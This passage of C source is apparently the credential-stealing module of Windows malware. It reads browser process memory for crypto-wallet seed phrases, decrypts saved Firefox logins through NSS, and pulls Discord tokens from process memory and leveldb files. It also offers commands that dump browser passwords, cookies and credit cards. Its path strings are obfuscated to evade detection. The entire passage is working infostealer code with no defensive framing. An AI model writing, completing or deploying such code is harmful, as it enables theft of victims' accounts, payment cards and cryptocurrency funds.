        if (wl < 3 || wl > 8) break;
        /* validate against BIP39 — build tmp ASCII word */
        uint8_t tmp[9];
        for (size_t k = 0; k < wl; k++) tmp[k] = b[ws + k*2];
        tmp[wl] = 0;
        if (!_in_bip39(tmp, wl)) return 0;
        for (int j = 0; j < words; j++) {
            if (wlens[j] == wl && memcmp(b + wstarts[j], b + ws, wl*2) == 0)
                return 0;
        }
        wstarts[words] = ws; wlens[words] = wl;
        total_chars += wl;
        words++;
        if (words == 24) break;
        /* expect UTF-16 space: 0x20 0x00 */
        if (p + 1 >= sz || b[p] != 0x20 || b[p+1] != 0x00) break;
        p += 2;
    }
    if (words < 12) return 0;
    if (total_chars / (size_t)words < 4) return 0;
    return p - start;
}

static void _scan_proc_bip39(DWORD pid, const char *pname,
                              char *out, size_t outsz, size_t *pos)
{
    HANDLE hp = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                            FALSE, pid);
    if (!hp) return;

    const size_t CHUNK = 65536;
    uint8_t *chunk = (uint8_t *)malloc(CHUNK);
    if (!chunk) { CloseHandle(hp); return; }

    MEMORY_BASIC_INFORMATION mbi;
    uint8_t *addr = NULL;
    size_t total_scanned = 0;

    while (VirtualQueryEx(hp, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (total_scanned > 256 * 1024 * 1024) break;
        if (mbi.State == MEM_COMMIT &&
            mbi.RegionSize > 0 &&
            mbi.RegionSize <= 64 * 1024 * 1024 &&
            !(mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) &&
            (mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE))) {
            total_scanned += mbi.RegionSize;

            uint8_t *cur = (uint8_t *)mbi.BaseAddress;
            size_t rem = mbi.RegionSize;
            while (rem > 0 && *pos + 256 < outsz) {
                SIZE_T rd = 0;
                SIZE_T to_read = rem < CHUNK ? rem : CHUNK;
                if (ReadProcessMemory(hp, cur, chunk, to_read, &rd) && rd > 0) {
                    for (size_t i = 0; i < rd; i++) {
                        /* ASCII scan */
                        if (_is_bip_char(chunk[i]) &&
                            (i == 0 || !_is_bip_char(chunk[i-1]))) {
                            size_t mlen = _match_mnemonic(chunk, i, rd);
                            if (mlen) {
                                char probe[33]; memcpy(probe, chunk+i, 32); probe[32]=0;
                                if (mlen < 32 || !strstr(out, probe)) {
                                    int n = snprintf(out + *pos, outsz - *pos - 1,
                                        "[ SEED : %s pid=%lu ]\n  %.*s\n\n",
                                        pname, (unsigned long)pid,
                                        (int)mlen, (char *)(chunk + i));
                                    if (n > 0 && (size_t)n < outsz - *pos - 1)
                                        *pos += (size_t)n;
                                }
                                i += mlen;
                                continue;
                            }
                        }
                        /* UTF-16 LE scan: lowercase ASCII byte followed by 0x00 */
                        if (i + 1 < rd && chunk[i+1] == 0x00 &&
                            _is_bip_char(chunk[i]) &&
                            (i < 2 || chunk[i-1] != 0x00 || !_is_bip_char(chunk[i-2]))) {
                            size_t mlen = _match_mnemonic_utf16(chunk, i, rd);
                            if (mlen) {
                                /* decode UTF-16 to ASCII for output */
                                char decoded[200] = {0};
                                size_t dc = 0;
                                for (size_t k = i; k < i + mlen && dc < 198; k += 2)
                                    decoded[dc++] = (char)chunk[k];
                                char probe[33]; memcpy(probe, decoded, 32); probe[32]=0;
                                if (!strstr(out, probe)) {
                                    int n = snprintf(out + *pos, outsz - *pos - 1,
                                        "[ SEED : %s pid=%lu ]\n  %s\n\n",
                                        pname, (unsigned long)pid, decoded);
                                    if (n > 0 && (size_t)n < outsz - *pos - 1)
                                        *pos += (size_t)n;
                                }
                                i += mlen;
                            }
                        }
                    }
                }
                cur += to_read;
                rem -= to_read;
            }
        }
        uint8_t *next = (uint8_t *)mbi.BaseAddress + mbi.RegionSize;
        if (next <= addr) break;
        addr = next;
    }

    free(chunk);
    CloseHandle(hp);
}

static void _dump_bip39_from_procs(char *out, size_t outsz, size_t *pos)
{
    static const char *TARGETS[] = {
        "chrome.exe", "brave.exe", "msedge.exe",
        "opera.exe", "vivaldi.exe", "chromium.exe", NULL
    };
    for (int i = 0; TARGETS[i]; i++) {
        DWORD pid = _find_browser_pid(TARGETS[i]);
        if (pid)
            _scan_proc_bip39(pid, TARGETS[i], out, outsz, pos);
    }
}

/* ── Firefox / Gecko NSS credential dump ─────────────────────────────── */

typedef void*  SECItem_ptr;
typedef int    (*NSS_Init_t)       (const char *configdir);
typedef void   (*NSS_Shutdown_t)   (void);
typedef void*  (*PK11_GetInternalKeySlot_t)(void);
typedef int    (*PK11_CheckUserPassword_t) (void *slot, const char *pwd);
typedef void   (*PK11_FreeSlot_t)          (void *slot);
typedef struct { unsigned char *data; unsigned int len; } _SECItem;
typedef int    (*PK11SDR_Decrypt_t) (const _SECItem *in, _SECItem *out, void *cx);
typedef void   (*SECITEM_ZfreeItem_t)(const _SECItem *item, int freeit);

static char *_ff_b64decode(const char *s, unsigned int *outlen)
{
    static const char *T="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    unsigned int slen = (unsigned int)strlen(s);
    unsigned int pad = 0;
    if (slen > 0 && s[slen-1]=='=') pad++;
    if (slen > 1 && s[slen-2]=='=') pad++;
    *outlen = slen / 4 * 3 - pad;
    unsigned char *buf = (unsigned char *)calloc(1, *outlen + 4);
    if (!buf) { *outlen = 0; return NULL; }
    unsigned int i, j = 0;
    for (i = 0; i + 3 < slen; i += 4) {
        const char *p0 = strchr(T, s[i]);
        const char *p1 = strchr(T, s[i+1]);
        const char *p2 = s[i+2]=='=' ? NULL : strchr(T, s[i+2]);
        const char *p3 = s[i+3]=='=' ? NULL : strchr(T, s[i+3]);
        if (!p0 || !p1) break;
        unsigned int v = ((unsigned int)(p0-T)<<18)|((unsigned int)(p1-T)<<12);
        if (p2) v |= (unsigned int)(p2-T)<<6;
        if (p3) v |= (unsigned int)(p3-T);
        buf[j++] = (v>>16)&0xFF;
        if (p2) buf[j++] = (v>>8)&0xFF;
        if (p3) buf[j++] = v&0xFF;
    }
    *outlen = j;
    return (char *)buf;
}

static void _ff_json_str(const char *json, const char *key,
                          char *out, size_t outsz)
{
    out[0] = '\0';
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\":\"", key);
    const char *p = strstr(json, needle);
    if (!p) return;
    p += strlen(needle);
    size_t i = 0;
    while (*p && *p != '"' && i + 1 < outsz) {
        if (*p == '\\' && *(p+1) == '"') { out[i++] = '"'; p += 2; }
        else out[i++] = *p++;
    }
    out[i] = '\0';
}

static void _ff_dump_profile(const char *ff_dir, const char *profile,
                              PK11SDR_Decrypt_t pDecrypt,
                              SECITEM_ZfreeItem_t pFree,
                              char *out, size_t outsz, size_t *pos)
{
    char lj[MAX_PATH];
    snprintf(lj, sizeof(lj), "%s\\%s\\logins.json", ff_dir, profile);

    HANDLE fh = CreateFileA(lj, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (fh == INVALID_HANDLE_VALUE) return;

    LARGE_INTEGER _li = {0};
    if (!GetFileSizeEx(fh, &_li) || _li.QuadPart == 0 || _li.QuadPart > 8 * 1024 * 1024)
        { CloseHandle(fh); return; }
    DWORD fsz = (DWORD)_li.LowPart;

    char *jbuf = (char *)calloc(1, fsz + 1);
    if (!jbuf) { CloseHandle(fh); return; }
    DWORD rd = 0;
    ReadFile(fh, jbuf, fsz, &rd, NULL);
    CloseHandle(fh);
    jbuf[rd] = '\0';

    const char *p = jbuf;
    while ((p = strstr(p, "\"encryptedUsername\"")) != NULL) {
        char eu[1024] = {0}, ep[1024] = {0}, url[512] = {0};

        /* backtrack to find hostname in this login object */
        const char *obj_start = p;
        for (int back = 0; back < 512 && obj_start > jbuf; back++, obj_start--)
            if (*obj_start == '{') break;
        _ff_json_str(obj_start, "hostname", url, sizeof(url));
        _ff_json_str(p, "encryptedUsername", eu, sizeof(eu));
        _ff_json_str(p, "encryptedPassword", ep, sizeof(ep));

        p += 20;

        if (!eu[0] || !ep[0]) continue;

        unsigned int ulen = 0, plen = 0;
        char *ubytes = _ff_b64decode(eu, &ulen);
        char *pbytes = _ff_b64decode(ep, &plen);
        if (!ubytes || !pbytes) { free(ubytes); free(pbytes); continue; }

        _SECItem in_u  = { (unsigned char *)ubytes, ulen };
        _SECItem in_p  = { (unsigned char *)pbytes, plen };
        _SECItem out_u = { NULL, 0 };
        _SECItem out_p = { NULL, 0 };

        int ok = 0;
        ok = (pDecrypt(&in_u, &out_u, NULL) == 0) &&
             (pDecrypt(&in_p, &out_p, NULL) == 0);

        if (ok && out_u.data && out_p.data) {
            char ustr[256] = {0}, pstr[256] = {0};
            unsigned int ul = out_u.len < 255 ? out_u.len : 255;
            unsigned int pl = out_p.len < 255 ? out_p.len : 255;
            memcpy(ustr, out_u.data, ul);
            memcpy(pstr, out_p.data, pl);
            size_t need = strlen(url) + strlen(ustr) + strlen(pstr) + 32;
            if (*pos + need < outsz)
                *pos += (size_t)snprintf(out + *pos, outsz - *pos,
                    "[Firefox] %s | %s | %s\n", url, ustr, pstr);
        }

        if (out_u.data) pFree(&out_u, 0);
        if (out_p.data) pFree(&out_p, 0);
        free(ubytes);
        free(pbytes);
    }
    free(jbuf);
}

static void _dump_firefox(char *out, size_t outsz, size_t *pos)
{
    char ff_dir[MAX_PATH];
    const char *appdata = getenv("APPDATA");
    if (!appdata) return;
    {
        char _ffsuf[40];
        EVS_D(_ffsuf, EVS_str_ff_profiles_dir);
        snprintf(ff_dir, sizeof(ff_dir), "%s\\%s", appdata, _ffsuf);
        SecureZeroMemory(_ffsuf, sizeof(_ffsuf));
    }

    /* find nss3.dll — try common install paths */
    char nss_path[MAX_PATH] = {0};
    {
        char _pf[64], _pf86[64], _bare[48], _local[64];
        EVS_D(_pf,   EVS_str_ff_nss3_pf);
        EVS_D(_pf86, EVS_str_ff_nss3_pf86);
        EVS_D(_bare, EVS_str_ff_nss3_bare);
        EVS_D(_local,EVS_str_ff_nss3_local);
        const char *nss_templates[] = { _pf, _pf86, _bare, _local };
        char nss_exp[MAX_PATH];
        for (int i = 0; i < 4; i++) {
            char tmp[MAX_PATH];
            snprintf(tmp, sizeof(tmp), "C:\\%s", nss_templates[i]);
            ExpandEnvironmentStringsA(i == 3 ? nss_templates[i] : tmp, nss_exp, sizeof(nss_exp));
            if (GetFileAttributesA(nss_exp) != INVALID_FILE_ATTRIBUTES) {
                strncpy(nss_path, nss_exp, sizeof(nss_path)-1);
                break;
            }
        }
        SecureZeroMemory(_pf,   sizeof(_pf));
        SecureZeroMemory(_pf86, sizeof(_pf86));
        SecureZeroMemory(_bare, sizeof(_bare));
        SecureZeroMemory(_local,sizeof(_local));
    }
    if (!nss_path[0]) return;

    /* add Firefox dir to PATH so nss3 can load its deps */
    char ff_bin[MAX_PATH];
    strncpy(ff_bin, nss_path, sizeof(ff_bin)-1);
    char *last = strrchr(ff_bin, '\\');
    if (last) *last = '\0';
    char oldpath[4096] = {0};
    GetEnvironmentVariableA("PATH", oldpath, sizeof(oldpath));
    char newpath[4096];
    snprintf(newpath, sizeof(newpath), "%s;%s", ff_bin, oldpath);
    SetEnvironmentVariableA("PATH", newpath);

    HMODULE hnss = LoadLibraryA(nss_path);
    SetEnvironmentVariableA("PATH", oldpath);
    if (!hnss) return;

    NSS_Init_t           pInit    = (NSS_Init_t)          GetProcAddress(hnss, "NSS_Init");
    NSS_Shutdown_t       pShut    = (NSS_Shutdown_t)      GetProcAddress(hnss, "NSS_Shutdown");
    PK11_GetInternalKeySlot_t pSlot = (PK11_GetInternalKeySlot_t)GetProcAddress(hnss, "PK11_GetInternalKeySlot");
    PK11_CheckUserPassword_t pPass = (PK11_CheckUserPassword_t) GetProcAddress(hnss, "PK11_CheckUserPassword");
    PK11_FreeSlot_t      pFreeSlot= (PK11_FreeSlot_t)     GetProcAddress(hnss, "PK11_FreeSlot");
    PK11SDR_Decrypt_t    pDecrypt = (PK11SDR_Decrypt_t)   GetProcAddress(hnss, "PK11SDR_Decrypt");
    SECITEM_ZfreeItem_t  pFree    = (SECITEM_ZfreeItem_t) GetProcAddress(hnss, "SECITEM_ZfreeItem");
    if (!pInit || !pSlot || !pPass || !pDecrypt || !pFree) {
        FreeLibrary(hnss);
        return;
    }

    /* enumerate profiles */
    char pat[MAX_PATH];
    snprintf(pat, sizeof(pat), "%s\\*", ff_dir);
    WIN32_FIND_DATAA fd;
    HANDLE hf = FindFirstFileA(pat, &fd);
    if (hf == INVALID_HANDLE_VALUE) { FreeLibrary(hnss); return; }

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (fd.cFileName[0] == '.') continue;

        char profile_path[MAX_PATH];
        snprintf(profile_path, sizeof(profile_path), "%s\\%s", ff_dir, fd.cFileName);

        if (pInit(profile_path) != 0) continue;

        void *slot = pSlot();
        if (slot) {
            pPass(slot, ""); /* empty master password — default */
            pFreeSlot(slot);
        }

        _ff_dump_profile(ff_dir, fd.cFileName, pDecrypt, pFree, out, outsz, pos);

        if (pShut) pShut();

    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
    FreeLibrary(hnss);
}

/* ── public entry point ──────────────────────────────────────────────── */

typedef struct { const char *name; char path[MAX_PATH]; int up; const char *proc; } _br_t;

static void _fill_br_paths(_br_t *B)
{
    char _s[48];
#define _BR_PATH(idx, pfx, evs_name) \
    EVS_D(_s, evs_name); \
    snprintf(B[idx].path, MAX_PATH, pfx "%s", _s); \
    SecureZeroMemory(_s, sizeof(_s))
    _BR_PATH(0, "%LOCALAPPDATA%\\", EVS_str_br_chrome_ud);
    _BR_PATH(1, "%LOCALAPPDATA%\\", EVS_str_br_edge_ud);
    _BR_PATH(2, "%LOCALAPPDATA%\\", EVS_str_br_brave_ud);
    _BR_PATH(3, "%LOCALAPPDATA%\\", EVS_str_br_chromium_ud);
    _BR_PATH(4, "%APPDATA%\\",      EVS_str_br_opera);
    _BR_PATH(5, "%APPDATA%\\",      EVS_str_br_operagx);
#undef _BR_PATH
}

int cmd_browser_dump(const char *args, char *output_buf, size_t output_size)
{
    (void)args;
    _bapi_init();

    _br_t BROWSERS[6] = {
        {"Chrome",   {0}, 1, "chrome.exe"},
        {"Edge",     {0}, 1, "msedge.exe"},
        {"Brave",    {0}, 1, "brave.exe"},
        {"Chromium", {0}, 1, "chromium.exe"},
        {"Opera",    {0}, 1, "opera.exe"},
        {"OperaGX",  {0}, 1, "opera.exe"},
    };
    _fill_br_paths(BROWSERS);

    size_t pos = 0;
    for (int i = 0; i < (int)(sizeof(BROWSERS) / sizeof(BROWSERS[0])); i++)
    {
        if (pos + 64 >= output_size) break;
        _dump_browser(BROWSERS[i].name, BROWSERS[i].path,
                      BROWSERS[i].up, BROWSERS[i].proc,
                      BROWSER_CREDS | BROWSER_COOKIES,
                      output_buf, output_size, &pos);
    }
    _dump_firefox(output_buf, output_size, &pos);
    _dump_bip39_from_procs(output_buf, output_size, &pos);
    if (pos == 0) { snprintf(output_buf, output_size, "[browser] no data\n"); return 1; }
    output_buf[pos] = 0;
    return 0;
}

/* helper: loop sur tous les browsers avec flags donnes */
static int _browser_loop(int flags, char *output_buf, size_t output_size)
{
    _br_t B[6] = {
        {"Chrome",   {0}, 1, "chrome.exe"},
        {"Edge",     {0}, 1, "msedge.exe"},
        {"Brave",    {0}, 1, "brave.exe"},
        {"Chromium", {0}, 1, "chromium.exe"},
        {"Opera",    {0}, 1, "opera.exe"},
        {"OperaGX",  {0}, 1, "opera.exe"},
    };
    _fill_br_paths(B);
    size_t pos = 0;
    for (int i = 0; i < (int)(sizeof(B)/sizeof(B[0])); i++) {
        if (pos + 64 >= output_size) break;
        _dump_browser(B[i].name, B[i].path, B[i].up, B[i].proc,
                      flags, output_buf, output_size, &pos);
    }
    if (flags & BROWSER_CREDS) _dump_bip39_from_procs(output_buf, output_size, &pos);
    if (pos == 0) return 1;
    output_buf[pos] = 0;
    return 0;
}

/* ── Discord token extractor ─────────────────────────────────────────── */

static int _is_b64c(uint8_t c)
{
    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
           (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=';
}

/* valid chars in a Discord token segment */
static int _is_dtok_char(uint8_t c)
{
    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
           (c >= '0' && c <= '9') || c == '_' || c == '-';
}

static int _discord_emit(const char *tok, size_t tlen, const char *flavor,
                          char *out, size_t outsz, size_t *pos,
                          char seen[][128], int *nseen)
{
    if (tlen < 50 || tlen >= 128) return 0;
    for (int d = 0; d < *nseen; d++)
        if (strncmp(seen[d], tok, tlen) == 0 && seen[d][tlen] == '\0') return 0;
    if (*nseen < 32) {
        memcpy(seen[*nseen], tok, tlen);
        seen[*nseen][tlen] = '\0';
        (*nseen)++;
    }
    if (*pos + 256 >= outsz) return 0;
    int n = snprintf(out + *pos, outsz - *pos,
                     "[ DISCORD : %s ]\n  TOKEN : %.*s\n\n",
                     flavor, (int)tlen, tok);
    if (n > 0) *pos += (size_t)n;
    return 1;
}

/* Scan raw buffer for Discord token patterns (no encryption needed) */
static int _discord_scan_mem_buf(const uint8_t *buf, size_t sz, const char *flavor,
                                  char *out, size_t outsz, size_t *pos,
                                  char seen[][128], int *nseen)
{
    int found = 0;
    size_t i = 0;
    while (i < sz) {
        if (!_is_dtok_char(buf[i])) { i++; continue; }
        size_t start = i;
        int d1 = -1, d2 = -1;
        int bad = 0;
        while (i < sz) {
            uint8_t c = buf[i];
            if (c == '.') {
                if      (d1 < 0) d1 = (int)(i - start);
                else if (d2 < 0) d2 = (int)(i - start);
                else { bad = 1; break; }
                i++;
            } else if (_is_dtok_char(c)) {
                i++;
            } else {
                break;
            }
        }
        if (bad || d1 < 0 || d2 < 0) continue;
        size_t tlen = i - start;
        int p1 = d1;
        int p2 = d2 - d1 - 1;
        int p3 = (int)tlen - d2 - 1;
        if (p1 < 20 || p1 > 32) continue;
        if (p2 < 4  || p2 > 8)  continue;
        if (p3 < 20 || p3 > 48) continue;
        found += _discord_emit((const char *)(buf + start), tlen,
                               flavor, out, outsz, pos, seen, nseen);
    }
    return found;
}

/* Scan all readable memory regions of a live Discord process */
static int _discord_scan_pid(DWORD pid, const char *flavor,
                              char *out, size_t outsz, size_t *pos,
                              char seen[][128], int *nseen)
{
    HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return 0;
    int found = 0;
    MEMORY_BASIC_INFORMATION mbi;
    uint8_t *addr = NULL;
    while (VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        DWORD p = mbi.Protect & 0xFF;
        int readable = (p == PAGE_READONLY || p == PAGE_READWRITE ||
                        p == PAGE_WRITECOPY || p == PAGE_EXECUTE_READ ||
                        p == PAGE_EXECUTE_READWRITE || p == PAGE_EXECUTE_WRITECOPY);
        if (mbi.State == MEM_COMMIT && readable &&
            !(mbi.Protect & PAGE_GUARD) &&
            mbi.RegionSize >= 64 && mbi.RegionSize <= 64 * 1024 * 1024) {
            uint8_t *rbuf = (uint8_t *)malloc(mbi.RegionSize + 1);
            if (rbuf) {
                SIZE_T nr = 0;
                if (ReadProcessMemory(hProc, mbi.BaseAddress, rbuf, mbi.RegionSize, &nr) && nr > 50)
                    found += _discord_scan_mem_buf(rbuf, nr, flavor, out, outsz, pos, seen, nseen);
                free(rbuf);
            }
        }
        uint8_t *next = (uint8_t *)mbi.BaseAddress + mbi.RegionSize;
        if (next <= addr) break;
        addr = next;
    }
    CloseHandle(hProc);
    return found;
}

/*
 * Scan raw buffer for Discord tokens. Handles both formats:
 *   - Old (pre-2023): dQw4w9WgXcQ: + base64(DPAPI_blob)
 *   - New (2023+):    dQw4w9WgXcQ: + base64("v10"|"v11" + nonce[12] + ct + tag[16])
 *                     decrypted with AES-256-GCM master key from Local State
 */
static int _discord_scan_buf(const uint8_t *buf, size_t sz,
                              const char *flavor,
                              char *out, size_t outsz, size_t *pos,
                              char seen[][128], int *nseen,
                              const uint8_t *mk, int have_mk)
{
    static const char PFX[] = "dQw4w9WgXcQ:";
    const size_t PFXL = sizeof(PFX) - 1;
    int found = 0;

    for (size_t i = 0; i + PFXL < sz; i++) {
        if (memcmp(buf + i, PFX, PFXL) != 0) continue;

        size_t b64_start = i + PFXL;
        size_t b64_end   = b64_start;
        while (b64_end < sz && _is_b64c(buf[b64_end])) b64_end++;
        size_t b64_len = b64_end - b64_start;
        if (b64_len < 32 || b64_len > 4096) { i = b64_end; continue; }

        char b64[4097];
        memcpy(b64, buf + b64_start, b64_len);
        b64[b64_len] = 0;

        size_t blob_len = 0;
        uint8_t *blob = base64_decode(b64, &blob_len);
        if (!blob) { i = b64_end; continue; }

        uint8_t *plain = NULL;
        size_t   plain_len = 0;

        /* New format: starts with "v10" or "v11" → AES-256-GCM */
        if (blob_len > 3 + 12 + 16 &&
            (memcmp(blob, "v10", 3) == 0 || memcmp(blob, "v11", 3) == 0) &&
            have_mk)
        {
            const uint8_t *nonce = blob + 3;
            const uint8_t *ct    = blob + 3 + 12;
            size_t ct_and_tag    = blob_len - 3 - 12;
            if (ct_and_tag > 16) {
                size_t ct_len = ct_and_tag - 16;
                const uint8_t *tag = ct + ct_len;
                plain = (uint8_t *)malloc(ct_len + 1);
                if (plain) {
                    if (_aes_gcm_dec(mk, nonce, 12, ct, ct_len, tag, plain) == 0) {
                        plain_len = ct_len;
                    } else {
                        free(plain); plain = NULL;
                    }
                }
            }
        }

        /* Old format: plain DPAPI blob */
        if (!plain) {
            _dpapi_dec(blob, blob_len, &plain, &plain_len);
        }

        free(blob);
        if (!plain || plain_len == 0) { free(plain); i = b64_end; continue; }

        if (plain_len > 511) plain_len = 511;
        plain[plain_len] = 0;

        /* dedup */
        int dup = 0;
        for (int d = 0; d < *nseen; d++)
            if (strcmp(seen[d], (char *)plain) == 0) { dup = 1; break; }
        if (!dup) {
            if (*nseen < 32) {
                strncpy(seen[*nseen], (char *)plain, 127);
                seen[*nseen][127] = 0;
                (*nseen)++;
            }
            if (*pos + 256 < outsz) {
                int n = snprintf(out + *pos, outsz - *pos,
                                 "[ DISCORD : %s ]\n  TOKEN : %s\n\n",
                                 flavor, (char *)plain);
                if (n > 0) *pos += (size_t)n;
                found++;
            }
        }
        free(plain);
        i = b64_end;
    }
    return found;
}

static void _scan_discord_ldb(const char *dir, const char *flavor,
                               char *out, size_t outsz, size_t *pos,
                               char seen[][128], int *nseen,
                               const uint8_t *mk, int have_mk)
{
    char pat[MAX_PATH];
    snprintf(pat, sizeof(pat), "%s\\*", dir);
    WIN32_FIND_DATAA fd;
    memset(&fd, 0, sizeof(fd));
    HANDLE hf = FindFirstFileA(pat, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;

    do {
        const char *dot = strrchr(fd.cFileName, '.');
        if (!dot) continue;
        if (_stricmp(dot, ".ldb") != 0 && _stricmp(dot, ".log") != 0) continue;

        char fpath[MAX_PATH];
        snprintf(fpath, sizeof(fpath), "%s\\%s", dir, fd.cFileName);

        HANDLE hfile = CreateFileA(fpath, GENERIC_READ,
                                   FILE_SHARE_READ | FILE_SHARE_WRITE,
                                   NULL, OPEN_EXISTING, 0, NULL);
        if (hfile == INVALID_HANDLE_VALUE) continue;

        LARGE_INTEGER li = {0};
        GetFileSizeEx(hfile, &li);
        if (li.QuadPart == 0 || li.QuadPart > 8 * 1024 * 1024) {
            CloseHandle(hfile); continue;
        }
        uint8_t *fbuf = (uint8_t *)malloc((size_t)li.QuadPart + 1);
        if (!fbuf) { CloseHandle(hfile); continue; }
        DWORD rd = 0;
        ReadFile(hfile, fbuf, (DWORD)li.QuadPart, &rd, NULL);
        CloseHandle(hfile);

        _discord_scan_buf(fbuf, (size_t)rd, flavor, out, outsz, pos, seen, nseen, mk, have_mk);
        free(fbuf);
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
}

int cmd_discord_tokens(const char *args, char *output_buf, size_t output_size)
{
    (void)args;

    static const struct {
        const char *flavor;
        const char *appdata_dir;
        const char *ldb_subdir;
        const wchar_t *exe;
    } DISCORD_PATHS[] = {
        {"Discord",       "discord",           "Local Storage\\leveldb", L"Discord.exe"},
        {"DiscordPTB",    "discordptb",        "Local Storage\\leveldb", L"DiscordPTB.exe"},
        {"DiscordCanary", "discordcanary",      "Local Storage\\leveldb", L"DiscordCanary.exe"},
        {"DiscordDev",    "discorddevelopment", "Local Storage\\leveldb", L"DiscordDevelopment.exe"},
    };
    int npaths = (int)(sizeof(DISCORD_PATHS)/sizeof(DISCORD_PATHS[0]));

    char seen[32][128];
    int nseen = 0;
    size_t pos = 0;

    /* Primary: scan live Discord process memory (works with all encryption variants) */
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnap, &pe)) {
            do {
                for (int j = 0; j < npaths; j++) {
                    if (_wcsicmp(pe.szExeFile, DISCORD_PATHS[j].exe) == 0) {
                        _discord_scan_pid(pe.th32ProcessID, DISCORD_PATHS[j].flavor,
                                          output_buf, output_size, &pos, seen, &nseen);
                        break;
                    }
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    /* Secondary: LDB file scan (works when Discord is closed) */
    for (int i = 0; i < npaths; i++) {
        char base[MAX_PATH], dir[MAX_PATH];
        snprintf(base, sizeof(base), "%%APPDATA%%\\%s", DISCORD_PATHS[i].appdata_dir);
        ExpandEnvironmentStringsA(base, dir, sizeof(dir));
        if (GetFileAttributesA(dir) == INVALID_FILE_ATTRIBUTES) continue;

        uint8_t mk[32] = {0};
        int have_mk = (_get_master_key(dir, mk) == 0);

        char ldb_dir[MAX_PATH];
        snprintf(ldb_dir, sizeof(ldb_dir), "%s\\%s", dir, DISCORD_PATHS[i].ldb_subdir);
        if (GetFileAttributesA(ldb_dir) == INVALID_FILE_ATTRIBUTES) continue;

        _scan_discord_ldb(ldb_dir, DISCORD_PATHS[i].flavor, output_buf, output_size,
                          &pos, seen, &nseen, mk, have_mk);

        SecureZeroMemory(mk, sizeof(mk));
    }

    if (pos == 0) {
        snprintf(output_buf, output_size, "[discord] no tokens found\n");
        return 1;
    }
    output_buf[pos] = 0;
    return 0;
}

int cmd_browser_cc(const char *args, char *output_buf, size_t output_size)
{
    (void)args;
    if (_browser_loop(BROWSER_CC, output_buf, output_size) != 0) {
        snprintf(output_buf, output_size, "[cc] no credit cards found\n");
        return 1;
    }
    return 0;
}

int cmd_browser_creds(const char *args, char *output_buf, size_t output_size)
{
    (void)args;
    if (_browser_loop(BROWSER_CREDS, output_buf, output_size) != 0) {
        snprintf(output_buf, output_size, "[creds] no passwords found\n");
        return 1;
    }
    return 0;
}

int cmd_browser_cookies(const char *args, char *output_buf, size_t output_size)
{
    (void)args;
    if (_browser_loop(BROWSER_COOKIES, output_buf, output_size) != 0) {
        snprintf(output_buf, output_size, "[cookies] no cookies found\n");
        return 1;
    }
    return 0;
}
